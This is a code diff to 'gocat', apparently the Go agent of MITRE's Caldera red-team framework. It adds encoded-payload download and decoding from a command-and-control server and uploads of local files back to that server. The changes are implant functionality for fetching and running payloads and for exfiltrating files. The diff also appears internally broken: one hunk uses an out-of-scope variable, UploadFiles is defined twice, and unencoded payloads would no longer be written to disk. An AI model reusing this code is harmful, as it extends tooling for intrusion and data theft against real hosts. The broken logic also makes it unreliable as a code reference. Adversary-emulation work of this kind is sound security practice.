@@ -14,6 +14,7 @@ import (
 	"strings"
 
 	"github.com/mitre/gocat/contact"
+	"github.com/mitre/gocat/encoders"
 	"github.com/mitre/gocat/execute"
 	"github.com/mitre/gocat/output"
 	"github.com/mitre/gocat/privdetect"
@@ -34,14 +35,17 @@ type AgentInterface interface {
 	SetCommunicationChannels(c2Config map[string]string) error
 	SetPaw(paw string)
 	Display()
-	DownloadPayloads(payloads []interface{}) []string
-	FetchPayloadBytes(payload string) []byte
+	DownloadInstructionPayloads(instruction map[string]interface{}) []string
+	FetchPayloadBytes(payload string, link_id string) []byte
 	ActivateLocalP2pReceivers()
 	TerminateLocalP2pReceivers()
 	HandleBeaconFailure() error
 	DiscoverPeers()
 	AttemptSelectComChannel(requestedChannelConfig map[string]string, requestedChannel string) error
 	GetCurrentContactName() string
+	DecodePayload(data []byte, encoding string, decodingOptions map[string]interface{}) []byte
+	EncodeUpload(data []byte, encoding string, encodingOptions map[string]interface{}) []byte
+	UploadFiles(uploadInfo []interface{})
 }
 
 // Implements AgentInterface
@@ -279,6 +283,30 @@ func (a *Agent) UploadFiles(uploadInfo []interface{}) {
 			output.VerbosePrint(fmt.Sprintf("[!] Error uploading file: %v", err.Error()))
 		}
 	}
+
+ 	// Perform any uploads after sending execution results
+ 	if instruction["uploads"] != nil && len(instruction["uploads"].([]interface{})) > 0 {
+ 		uploads, ok := instruction["uploads"].([]interface{})
+ 		if !ok {
+ 			output.VerbosePrint(fmt.Sprintf(
+				"[!] Error: expected []string, but received %T for upload info",
+				instruction["uploads"],
+			))
+ 		} else {
+ 			a.UploadFiles(uploads)
+ 		}
+ 	}
+}
+
+// Uploads files according the specified encoding mechanism, if available.
+func (a *Agent) UploadFiles(uploadInfo []interface{}) {
+	for _, path := range uploadInfo {
+		filePath := path.(string)
+		output.VerbosePrint(fmt.Sprintf("Uploading file: %s", filePath))
+		if err := a.beaconContact.UploadFile(a.GetFullProfile(), filePath); err != nil {
+			output.VerbosePrint(fmt.Sprintf("[!] Error uploading file: %v", err.Error()))
+		}
+	}
 }
 
 // Sets the communication channels for the agent according to the specified channel configuration map.
@@ -350,14 +378,31 @@ func (a *Agent) displayLocalReceiverInformation() {
 	}
 }
 
-// Will download each individual payload listed, write them to disk,
-// and will return the full file paths of each downloaded payload.
-func (a *Agent) DownloadPayloads(payloads []interface{}) []string {
+// Will download each individual payload listed in the provided instruction and write them to disk,
+// and will return the full file paths of each downloaded payload. If payload is encoded, the encoding
+// mechanism must also be provided in the instruction in order to decode the payload properly.
+func (a *Agent) DownloadInstructionPayloads(instruction map[string]interface{}) []string {
 	var droppedPayloads []string
+	var encodingOptions map[string]interface{}
+	payloads := instruction["payloads"].([]interface{})
+	link_id := instruction["id"].(string)
+
+	// Get payload encoding and options
+	encodingStr := ""
+	if encoding, ok := instruction["file_encoding"]; ok {
+		encodingStr = encoding.(string)
+	}
+	if providedOptions, ok := instruction["encoding_options"]; ok {
+		if err := json.Unmarshal([]byte(providedOptions.(string)), &encodingOptions); err != nil {
+			output.VerbosePrint(fmt.Sprintf("[-] Error unpacking encoding options: %v", err.Error()))
+		}
+	}
+
+	// Get payloads
 	availablePayloads := reflect.ValueOf(payloads)
 	for i := 0; i < availablePayloads.Len(); i++ {
 		payload := availablePayloads.Index(i).Elem().String()
-		location, err := a.WritePayloadToDisk(payload)
+		location, err := a.WritePayloadToDisk(payload, encodingStr, encodingOptions, link_id)
 		if err != nil {
 			output.VerbosePrint(fmt.Sprintf("[-] %s", err.Error()))
 			continue
@@ -367,10 +412,43 @@ func (a *Agent) DownloadPayloads(payloads []interface{}) []string {
 	return droppedPayloads
 }
 
+func (a *Agent) DecodePayload(data []byte, encoding string, decodingOptions map[string]interface{}) []byte {
+	if encoder, ok := encoders.DataEncoders[encoding]; ok {
+		decoded, err := encoder.DecodeData(data, decodingOptions)
+		if err != nil {
+			output.VerbosePrint(fmt.Sprintf("[!] Error decoding payload: %s", err.Error()))
+			return nil
+		}
+		return decoded
+	} else {
+		output.VerbosePrint(fmt.Sprintf("[!] No encoder found for encoding %s", encoding))
+		return nil
+	}
+}
+
+func (a *Agent) EncodeUpload(data []byte, encoding string, decodingOptions map[string]interface{}) []byte {
+	if encoder, ok := encoders.DataEncoders[encoding]; ok {
+		encoded, err := encoder.EncodeData(data, decodingOptions)
+		if err != nil {
+			output.VerbosePrint(fmt.Sprintf("[!] Error encoding upload: %s", err.Error()))
+			return nil
+		}
+		return encoded
+	} else {
+		output.VerbosePrint(fmt.Sprintf("[!] No encoder found for encoding %s", encoding))
+		return nil
+	}
+}
+
 // Will download the specified payload and write it to disk using the filename provided by the C2.
+// If payload is encoded, the encoding mechanism must also be provided in order to decode the payload properly.
 // Returns the C2-provided filename or error.
-func (a *Agent) WritePayloadToDisk(payload string) (string, error) {
-	payloadBytes, filename := a.FetchPayloadBytes(payload)
+func (a *Agent) WritePayloadToDisk(payload string, encoding string, encodingOptions map[string]interface{}, link_id string) (string, error) {
+	fetchedBytes, filename := a.FetchPayloadBytes(payload, link_id)
+	var payloadBytes []byte
+	if len(encoding) > 0 {
+		payloadBytes = a.DecodePayload(fetchedBytes, encoding, encodingOptions)
+	}
 	if len(payloadBytes) > 0 && len(filename) > 0 {
 		location := filepath.Join(filename)
 		if !fileExists(location) {
@@ -383,9 +461,9 @@ func (a *Agent) WritePayloadToDisk(payload string) (string, error) {
 }
 
 // Will request payload bytes from the C2 for the specified payload and return them.
-func (a *Agent) FetchPayloadBytes(payload string) ([]byte, string) {
-	output.VerbosePrint(fmt.Sprintf("[*] Fetching new payload bytes via C2 channel %s: %s", a.GetCurrentContactName(), payload))
-	return a.beaconContact.GetPayloadBytes(a.GetTrimmedProfile(), payload)
+func (a *Agent) FetchPayloadBytes(payload string, link_id string) ([]byte, string) {
+	output.VerbosePrint(fmt.Sprintf("[*] Fetching new payload bytes: %s", payload))
+	return a.beaconContact.GetPayloadBytes(a.GetTrimmedProfile(), payload, link_id)
 }
 
 func (a *Agent) Sleep(sleepTime float64) {
@@ -421,8 +499,9 @@ func (a *Agent) StoreDeadmanInstruction(instruction map[string]interface{}) {
 
 func (a *Agent) ExecuteDeadmanInstructions() {
 	for _, instruction := range a.deadmanInstructions {
-		output.VerbosePrint(fmt.Sprintf("[*] Running deadman instruction %s", instruction["id"]))
-		droppedPayloads := a.DownloadPayloads(instruction["payloads"].([]interface{}))
+		link_id := instruction["id"].(string)
+		output.VerbosePrint(fmt.Sprintf("[*] Running deadman instruction %s", link_id))
+		droppedPayloads := a.DownloadInstructionPayloads(instruction)
 		a.RunInstruction(instruction, droppedPayloads, false)
 	}
 }
